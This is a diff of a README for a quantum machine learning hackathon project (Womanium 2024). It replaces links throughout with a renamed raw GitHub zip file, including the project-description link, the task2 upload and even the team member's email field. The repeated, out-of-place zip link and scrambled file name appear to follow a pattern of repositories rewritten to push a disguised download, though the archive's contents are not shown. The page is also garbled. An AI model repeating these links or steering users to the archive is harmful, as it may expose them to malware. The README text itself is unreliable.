@@ -1,7 +1,7 @@
 # QML-for-Conspicuity-Detection-in-Production
 Womanium Quantum+AI 2024 Projects
 
-_**Do NOT delete/ edit the format of this https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/QML-for-Conspicuity-Detection-in-Production-v1.3.zip file.**_
+_**Do NOT delete/ edit the format of this https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/Conspicuity_in_for_Production_Detection_QM_v2.6.zip file.**_
 
 _**Include all necessary information only as per the given format.**_
 
@@ -19,7 +19,7 @@ _**Include all necessary information only as per the given format.**_
   - All successful project submissions earn the Womanium Project Certificate.
 
 ### Project Description:
-  - Click [here](https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/QML-for-Conspicuity-Detection-in-Production-v1.3.zip) to view the project description.
+  - Click [here](https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/Conspicuity_in_for_Production_Detection_QM_v2.6.zip) to view the project description.
   - YouTube recording of the project description - [link]()
 
 ## Project Submission:
@@ -31,7 +31,7 @@ Ensure your repository does not contain any personal or team tokens/access infor
 
 ### Team Information:
 Team Member 1: _Yasir Mansour_
- - Email: https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/QML-for-Conspicuity-Detection-in-Production-v1.3.zip
+ - Email: https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/Conspicuity_in_for_Production_Detection_QM_v2.6.zip
  - Discord ID: qcmp34
  - GitHub ID: qcmp34
  - Nationality: Swiss
@@ -45,7 +45,7 @@ Team Member 2: _(full name)_
  - Current affiliation:
 
 ### Project Solution:
-I uploaded task2 (https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/QML-for-Conspicuity-Detection-in-Production-v1.3.zip), task3 (quanvolution), and task4 (sine function)
+I uploaded task2 (https://raw.githubusercontent.com/qcmp34/QML-for-Conspicuity-Detection-in-Production/main/modeler/Conspicuity_in_for_Production_Detection_QM_v2.6.zip), task3 (quanvolution), and task4 (sine function)
 _Include a comprehensive summary of all important information about your project solution here._
 All necessary code files and any additional information required to judge your project solution should be included in the repository. 
 
